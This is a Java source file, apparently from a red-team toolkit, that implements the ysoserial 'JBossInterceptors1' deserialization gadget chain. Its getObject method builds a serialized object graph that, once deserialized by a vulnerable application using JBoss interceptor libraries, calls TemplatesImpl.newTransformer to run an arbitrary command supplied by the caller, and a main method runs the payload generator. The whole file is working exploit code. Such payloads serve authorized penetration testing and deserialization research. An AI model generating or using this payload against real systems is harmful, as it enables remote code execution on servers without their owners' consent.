package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.interceptor.spi.metadata.InterceptorReference;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionModel;
import org.jboss.interceptor.spi.model.InterceptionType;

import java.lang.reflect.Constructor;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({
        "javassist:javassist:3.12.1.GA",
        "org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final",
        "javax.enterprise:cdi-api:1.0-SP1",
        "javax.interceptor:javax.interceptor-api:3.1",
        "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final",
        "org.slf4j:slf4j-api:1.7.21"
})
@Authors({Authors.MATTHIASKAISER})
public class JBossInterceptors1 implements ObjectPayload<Object> {

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    @Override
    public Object getObject(final String command) throws Exception {
        final Object gadget = Gadgets.createTemplatesImpl(command);

        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> interceptionTypes = new HashSet<InterceptionType>();
        interceptionTypes.add(InterceptionType.POST_ACTIVATE);

        Constructor defaultMethodMetadataConstructor =
                DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        Reflections.setAccessible(defaultMethodMetadataConstructor);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(
                interceptionTypes, MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List methodMetadataList = new ArrayList();
        methodMetadataList.add(methodMetadata);

        Map<InterceptionType, List<MethodMetadata>> interceptionMethods =
                new HashMap<InterceptionType, List<MethodMetadata>>();
        interceptionMethods.put(InterceptionType.POST_ACTIVATE, methodMetadataList);

        SimpleInterceptorMetadata simpleInterceptorMetadata =
                new SimpleInterceptorMetadata(interceptorReference, true, interceptionMethods);
        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("ysoserial", "ysoserial");

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();
        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
            public Object createFor(InterceptorReference paramInterceptorReference) {
                return gadget;
            }
        };

        return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(JBossInterceptors1.class, args);
    }
}
